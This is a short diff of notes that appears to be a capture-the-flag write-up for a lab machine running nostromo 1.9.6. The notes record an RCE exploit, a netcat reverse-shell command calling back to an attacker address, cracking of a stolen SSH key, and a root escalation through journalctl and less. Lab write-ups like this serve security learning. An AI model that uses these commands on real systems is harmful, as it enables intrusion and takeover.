@@ -1,0 +1,16 @@
+- Did an nmap and found two ports open 22-ssh and 80-running nostromo 1.9.6 (instead of our usual apache).
+- nostromo 1.9.6 had an rce vulnerability
+- The CVE is in this folder
+- The python script needed the host ip host port and a command to be executed on the host
+- Used ./nostroSploit.py 10.10.10.165 80 "nc -e /bin/sh 10.10.14.140 4444"   (netcat reverse shell)
+- Got shell as www-data and found a folder /var/nostromo/ containing a hint to a directory public_www
+- This folder was in another user David's home
+- It has david's ssh private rsa in a tar archive
+- Transferred the file to local machine using nc (google if you forgot).
+- untarred passed the ssh key through sshng2john.py and passed to john to crack.
+- The password was hunter
+- Logged in as david.
+- He had a binary that hinted to the allowed sudo command called journalctl
+- executed this command whose output was shown in less
+- A gtfobin said to spawn interactive shell from this by hitting !/bin/bash 
+- Got root.
